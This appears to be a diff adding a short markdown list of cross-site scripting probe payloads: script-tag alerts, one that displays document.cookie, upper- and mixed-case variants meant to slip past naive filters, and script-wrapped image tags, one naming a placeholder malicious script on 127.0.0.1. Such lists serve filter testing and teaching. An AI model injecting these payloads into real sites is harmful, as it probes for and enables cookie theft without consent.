@@ -1,0 +1,7 @@
+### SCRIPT
+* <script>alert("hi there~");</script>
+* <script>alert(document.cookie);</script>
+* <SCRIPT>alert("hi");</SCRIPT>
+* <ScRiPt>alert("hi");</ScRiPt>
+* <script><img src="https://www.collinsdictionary.com/images/full/apple_158989157.jpg"></img></script>
+* <script><img src="https://127.0.0.1/hackers_malscript.js"></img></script>
